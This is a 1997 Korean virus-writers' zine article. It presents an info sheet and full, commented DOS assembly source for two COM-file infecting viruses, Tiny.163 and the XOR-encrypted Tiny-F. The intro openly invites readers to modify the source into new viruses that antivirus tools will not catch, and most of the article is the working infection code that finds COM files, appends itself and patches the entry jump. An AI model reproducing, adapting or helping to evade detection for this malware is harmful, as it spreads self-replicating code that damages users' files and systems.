
  Tiny.163 바이러스 분석                                        CVC #02, 97/09

------------------------------------------------------------------------------>
    
     바이러스 분석부분은 내 처음 잡지를 만들때부터 구상했던 것이다
     나는 2종류의 TINY VIRUS (TINY 와 TINY-F) 를 소개할것입니다 
     이2개의 바이러스를 가지고 여러분은 소스를 변화시켜 세로운 바이러
     스를 만들수 있고 벡신에 안걸리게 만들수도 있읍니다
     
     *** 만약 여러분께서 저에게 바이러스 소스 코드를 보내고 싶다면 
         보내셔도 상관이 없읍니다. 하지만 EXE.COM 파일들은 저에게
         보내지 마십시오 보내는 즉시 파일을 지워 버릴것입니다 !
         
                                       
                    TINY 바이서스 분석
   -------------------------------------------------------------------
   이름;        tiny
   별명;        163 com 바이러스,tiny 163 바이러스, kennedy-163
   발견날짜;    1990년 6월
   증상;        COMMAND.COM 과 COM 파일중가
   처음 발견된곳 ; 덴마크
   감염길이;    163 바이트
   감염형태;    기생형,비상주형 COM파일감영
   찾는 백신;   VIRUSCAN V64+,F-PORT 1.12+ ,NAV, IBM SCAN 2.00+
   제거 백신;   SCAN/D, F-PROT 1.12+ 또는 감염된 파일을을 지운다
   부가설명;    163 COM 바이러스.또는 tiny 바이러스 로 1990년 6월에
                프리드릭 스컬슨에 의해 발견 되었다 
                이 바이러스는 com 파일과 command.com 파일을 감염 시킨다
                바이러스에 감염된 프로그램을 실행시키면 현재 디렉토리에서
                COM 형 파일를 찾아서 감염시킨다. 부트 디스켓 상에서는 
                COMMAND.COM에 감염된다
                다른파일에 감염 될때는 대체적으로 1킬로 바이트 보다 큰
                파일에 감염된다 . 감염된 파일은 길이가 163 바이트 증가
                하고, 파일의 날짜와 시간을 감염된 날짜와 시간으로 바꾼
                다 , 감염된 파일은 16진수 문자열인 '2A2E434F4D00' 를 
                가지고 있다           
   --------------------------------------------------------------------
   
               티니 바이러스 소스코드 
              -----------------------     
PAGE  59,132


data_2e         equ     1ABh                    ;바이러스 의시작

seg_a           segment byte public             ;
                assume  cs:seg_a, ds:seg_a      ;cs, ds 의 정의


                org     100h                    ;모든 COM files 시작
s               proc    far

start:
                jmp     loc_1                   ;virus 로 분기한다


;이곳은 감염된 파일이 위치한다

                db      0CDh, 20h, 7, 8, 9      ;int 20h
                                                ;pop es

loc_1:
                call    sub_1                   ;



s               endp


sub_1           proc    near                    ;
                pop     si                      ;virus code를 SI에 위
                                                    치시킨다
                sub     si,10Bh                 ;COM 파일이 바이러스에
                mov     bp,data_1[si]           ;감염 되면 옵셋이 변
                add     bp,103h                 ;한다
                lea     dx,[si+1A2h]            ;속성이 NOMAL 인 파일
                xor     cx,cx                   ;찾는다
                                                
                mov     ah,4Eh                  ;첫번째 파일을 찾는다
loc_2:
                int     21h                     ;

                jc      loc_6                   ;파일를 못찾으면 끝낸
                                                ;    다                                  
                mov     dx,9Eh                  ;파일을 찾으면 읽기 
                mov     ax,3D02h                ;쓰기로 파일를 연다
                int     21h                     ;

                mov     bx,ax                   ;파일 핸들을 BX에 저장
                mov     ah,3Fh                  ;버퍼로 부터 파일을 
                lea     dx,[si+1A8h]            ;읽는다 
                mov     di,dx                   ;
                mov     cx,3                    ;3바이트를 읽는다
                int     21h                     ;
                
                cmp     byte ptr [di],0E9h      ;바이러스 문자열과                                                 
                                                ;비교한다
                je      loc_4                   ;
loc_3:
                mov     ah,4Fh                  ;다음 파일를 찾는다
                jmp     short loc_2             ;테스트 한다
loc_4:
                mov     dx,[di+1]               
                mov     data_1[si],dx           
                xor     cx,cx                   
                mov     ax,4200h                ;file pointer를 셋
                int     21h                     ;트 한다

                mov     dx,di                   ;버퍼에 저장된 파일
                mov     cx,2                    ;2 바이트 읽어 온다
                mov     ah,3Fh                  ;
                int     21h                     

                cmp     word ptr [di],807h      ;바이러스 문자열과 비
                                                ;교 한다
                je      loc_3                   ;같으면 다른 파일을
                                                ;찾는다
                                                

                xor     dx,dx                   ;file pointer 를
                xor     cx,cx                   ;셋트한다
                mov     ax,4202h                ;
                int     21h                     ;

                cmp     dx,0                    
                jne     loc_3                   
                cmp     ah,0FEh                              
                jae     loc_3                   

                mov     ds:data_2e[si],ax       ;
                mov     ah,40h                  ;파일에  쓴다
                lea     dx,[si+105h]            ;
                mov     cx,0A3h                 ;163 바이트 쓴다
                int     21h                     ;

                jc      loc_5                   ;에러면 끝낸다
                mov     ax,4200h                ;파일처음으로 포인터
                xor     cx,cx                   ;를 옮긴다
                mov     dx,1                    
                int     21h                     

                mov     ah,40h                  ;파일에 쓴다
                lea     dx,[si+1ABh]            ;
                mov     cx,2                    ;
                int     21h                     ;

;now close the file

loc_5:
                mov     ah,3Eh                  ;파일 닫기
                int     21h                     ;

loc_6:
                jmp     bp                      ;정상파일로 분기

data_1          dw      0                       ;
                db      '*.COM',0               ;와일드 카드 문자열


sub_1           endp
seg_a           ends
                end     start
----------------------------------------------------------------------------

             Tiny-F 소스 코드

----------------------------------------------------------------------------
tinyv   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:tinyv, DS:tinyv, SS:tinyv, ES:tinyv

        ORG     100h

DOS     EQU     21h

start:  JMP     pgstart
exlbl:  db      0CDh, 20h, 7, 8, 9
pgstart:CALL    tinyvir
tinyvir:
        POP     SI                      ; SI 를 저장한다
        SUB     SI,offset tinyvir       ; SI 를 바이러스 시작점으로 변
                                        ; 경 한다
        MOV     BP,[SI+blnkdat]         ; SI를 BP에 저장한다
        ADD     BP, OFFSET exlbl
        CALL    endecrpt
        JMP     SHORT realprog

;-----------------------------------------------------------------------------
; nonencrypted subroutines start here
;-----------------------------------------------------------------------------

; PCM 의 암호화는 별것 아니다 , 내것이 더 좋다  - Dark Angel
endecrpt:
; 단지 레지스터를 저장하면 된다  - Dark Angel
        PUSH    AX                      ; 레지스터 저장
        PUSH    BX
        PUSH    CX
        PUSH    SI
; 여기부터 암호와 기법이 소개된다
        MOV     BX, [SI+EN_VAL]
        ADD     SI, offset realprog
        MOV     CX, endenc - realprog
        SHR     CX, 1
        JNC     start_encryption
        DEC     SI
start_encryption:
        MOV     DI, SI
encloop:
        LODSW                           ; DS:[SI] -> AX
        XOR     AX, BX
        STOSW
        LOOP    encloop

        POP     SI                      ; 
        POP     CX
        POP     BX
        POP     AX
        RET
;-----암호화 루틴 끝
nfect:
        CALL    endecrpt
        MOV     [SI+offset endprog+3],AX
        MOV     AH,40H                   
        LEA     DX,[SI+0105H]            
        MOV     CX,offset endprog-105h   
        INT     DOS                      
        PUSHF
        CALL    endecrpt
        POPF
        JC      outa1                    
        RET
outa1:
        JMP     exit


;-----------------------------------------------------------------------------
;    비암호와 루틴 끝
;-----------------------------------------------------------------------------
realprog:
        CLD  
; Why save DTA?  This part killed.  Saves quite a few bytes.  Dark Angel
; Instead, set DTA to SI+ENDPROG+131h
        MOV     AH, 1Ah                 ; dta를 셋트한다
        LEA     DX, [SI+ENDPROG+131h]   ;  DS:DX
        INT     21h

        LEA     DX,[SI+fspec]           ; COM 형 파일을 찾는다
        XOR     CX, CX                  ;        ||   
        MOV     AH,4EH                  ;        ||   (files 찾기)
mainloop:                               ;       \||/
        INT     DOS                     ;    ----\/----
        JC      hiccup                  ; file 몾찾으면 끝낸다
; 세로운 DTA 설정 - Dark Angel
        LEA     DX, [SI+ENDPROG+131h+30]; file 이름 설정
                                        ; (offset 30 은 DTA file이름의
                                        ; 시작)
        MOV     AX,3D02H                ; 파일열기
        INT     DOS                     ; 
        MOV     BX,AX                   ; 파일 핸들을 BX로 옮긴다
        MOV     AH,3FH                  ; file 읽기
        LEA     DX,[SI+endprog]         ; program 의 끝을 로드한다
        MOV     DI,DX                   ; 버퍼을 위한 초기화
        MOV     CX,0003H                ; 3 bytes 읽기
        INT     DOS                     ; 
        CMP     BYTE PTR [DI],0E9H      ; JMP 명령를 체크
        JE      infect                  ; w/JMP 와 같으면 감염
nextfile:
        MOV     AH,4FH                  ; int 21 셋트한다
        JMP     mainloop                ; 다음 파일로 이동한다
hiccup: JMP     exit
infect:
        MOV     AX,5700h                ; 날짜를 얻는다
        INT     DOS                     ; 
        PUSH    DX                      ; 나짜와 시간 저장한다
        PUSH    CX
        MOV     DX,[DI+01H]             ; # 를 셋트한다
        MOV     [SI+blnkdat],DX         ;  
; Tighter Code here - Dark Angel
        XOR     CX,CX                   ;  
        MOV     AX,4200H                ; file 를 옮긴다
        INT     DOS                     ; 
        MOV     DX,DI                   ; buffer를 위하여 셋트한다
        MOV     CX,0002H                ; 2 bytes
        MOV     AH,3FH                  ; file 를 읽는다
        INT     DOS                     ; 실행
        CMP     WORD PTR [DI],0807H     ; 감염검사
        JE      nextfile                ; 감염됐으면 다음 파일로 간다
getaval:                                ; 암호화  루틴 시작
; 내가 수정했다 - Dark Angel
        MOV     AH, 2Ch                 ; TIME 를 얻는다
        INT     DOS                     ; 실행
        OR      DX, DX                  ;  0 인가
        JE      getaval                 ; 0이면 다시시도
        MOV     word ptr [si+offset en_val], DX ; 저장
; Tighter code here - Dark Angel
        XOR     DX,DX                   ; 레지스터를 0 으로 만든다
        XOR     CX,CX                   ;   "    "    "
        MOV     AX,4202H                ; 파일 포인터를 옮긴다
        INT     DOS                     ; 실행
        OR      DX,DX                   ; 포인터를 0으로 맞춘다
        JNE     nextfile                ; 다음 file 이 없으면
        CMP     AH,0FEH                 ; pointer 를 좀더 높게 한다
        JNC     nextfile                ; 맞으면 다시 시도
        CALL    nfect
        MOV     AX,4200H                ; pointer 를 옮긴다
        XOR     CX, CX                  ; 레지스터를 0으로
        MOV     DX,OFFSET 00001         ; pointer 를 셋트한다
        INT     DOS                     ; 실행
        MOV     AH,40H                  ; file 에 쓴ㄷ
        LEA     DX,[SI+offset endprog+3]; SI+BUFFER 데이타을 쓴다
        MOV     CX,0002H                ; 2 bytes ( JMP)
        INT     DOS                     ; 실행
        MOV     AX,5701h                ; date 저장
        POP     CX                      ; time 복구
        POP     DX                      ; date  복구
        INT     DOS                     ; 실행
exit:
        MOV     AH,3EH                  ; file 닫기
        INT     DOS                     ; 실행

; DTA 를 처음 설정으로 바꾼다

        MOV     AH, 1Ah                 ; DTA 설정
        MOV     DX, 80h                 ;  
        INT     21h

        JMP     BP

;-----------------------------------------------------------------------------
; 암호화된 데이타가 여기서 부터 나왔다
;-----------------------------------------------------------------------------

fspec   LABEL   WORD
        DB      '*.COM',0
nondata DB      'Tiny-F version 1.1'    ; Program 이름
        DB      'Dark Angel'          ; 재작자 이름
        DB      'Released 10-19-91'     ; 제작 일
endenc  LABEL   BYTE                    ; 암호화 데이타 끝e
;-----------------------------------------------------------------------------
; 비 암호화된 데이타가 여기서 부터 시작
;-----------------------------------------------------------------------------

blnkdat LABEL   WORD
        DW      0000H

en_val  DW      0h

endprog LABEL   WORD
tinyv   ENDS
        END     start
----------------------------------------------------------------------------
                끝 입니다
                
